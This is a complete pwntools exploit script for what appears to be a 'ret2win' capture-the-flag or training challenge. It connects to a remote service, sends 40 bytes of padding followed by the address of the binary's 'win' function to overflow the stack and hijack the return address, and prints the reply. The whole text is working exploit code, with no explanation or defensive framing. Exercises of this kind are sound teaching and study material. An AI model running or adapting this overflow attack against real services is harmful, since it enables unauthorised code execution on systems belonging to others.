from pwn import *
import os, sys
context.arch = "amd64"
context.log_level = "error"
elf = ELF("/app/ret2win") if os.path.exists("/app/ret2win") else ELF("./ret2win")
host, port = (sys.argv[1], int(sys.argv[2])) if len(sys.argv) > 2 else ("target", 1337)
p = remote(host, port)
p.recvline()
p.send(b"A" * 40 + p64(elf.symbols["win"]))
print(p.recvall(timeout=5).decode(errors="replace"))
